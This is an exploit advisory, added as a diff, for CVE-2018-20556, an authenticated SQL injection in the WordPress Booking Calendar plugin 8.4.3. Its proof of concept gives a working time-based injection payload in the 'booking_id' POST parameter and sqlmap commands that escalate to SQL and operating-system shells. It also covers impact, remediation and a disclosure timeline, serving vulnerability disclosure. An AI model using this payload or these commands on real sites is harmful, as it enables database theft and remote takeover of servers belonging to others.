@@ -1,0 +1,58 @@
+# Exploit Title: Wordpress Booking Calendar v8.4.3 - Authenticated SQL Injection Vulnerability
+# Date: 2018-12-28
+# Exploit Author: B0UG
+# Vendor Homepage: https://wpbookingcalendar.com/
+# Software Link: https://wordpress.org/plugins/booking/
+# Version: Tested on version 8.4.3 (older versions may also be affected)
+# Tested on: WordPress
+# Category : Webapps
+# CVE: CVE-2018-20556
+
+#I. VULNERABILITY
+
+Authenticated SQL Injection
+ 
+#II. BACKGROUND
+'Booking Calendar' WordPress plugin developed by oplugins is a booking system which allows website visitors to check the availability of services and make reservations.
+
+#III. DESCRIPTION
+An authenticated SQL Injection vulnerability in the 'Booking Calendar' WordPress plugin allows an attacker to read arbitrary data from the database. 
+
+#IV. PROOF OF CONCEPT
+1) Access WordPress control panel.
+2) Navigate to the Booking Calendar plugin page.
+3) Set up Burp Suite to capture the traffic.
+4) Select one of the booking entries and click on the 'Trash Can' button to delete the entry.
+5) Within Burp Suite, analyse the POST request and idenitfy the parameter 'booking_id'.
+6) The 'booking_id' parameter is vulnerable to the following different types of SQL injection: 
+• Boolean based blind injection
+• Error based injection
+• Time based injection
+
+7) We can perform a time based SQL injection by appending   ) AND SLEEP(100) AND (1=1   after the ID value in the parameter as shown below.
+action=TRASH_RESTORE&booking_id=573) AND SLEEP(100) AND (1=1&is_send_emeils=1&denyreason=&user_id=1&wpdev_active_locale=en_US&is_trash=1&wpbc_nonce=99c5ffaa67
+
+Obtaining a shell using sqlmap
+-----------------------
+• Obtain a SQL Shell
+Sqlmap –r post-request.txt –p booking_id --sql-shell
+
+• Obtain a Linux Shell
+Sqlmap –r post-request.txt –p booking_id --os-shell
+
+• Obtain a Windows Command Prompt
+Sqlmap –r post-request.txt –p booking_id --os-cmd
+
+#V. IMPACT
+The vulnerability allows an attacker to read arbitrary data from the database. It is possible to get a remote shell from this vulnerability.
+ 
+#VI. SYSTEMS AFFECTED
+WordPress websites running 'Booking Calendar' WordPress plugin version 8.4.3 (older versions may also be affected).
+ 
+#VII. REMEDIATION
+Uninstall the plugin until the vulnerability has been fixed by the developer.
+
+#VIII. DISCLOSURE TIMELINE
+#December 28, 2018 1: Vulnerability identified.
+#December 28, 2018 2: Informed developer of the vulnerability.
+#February 14, 2019 3: No communication received back from the developer.
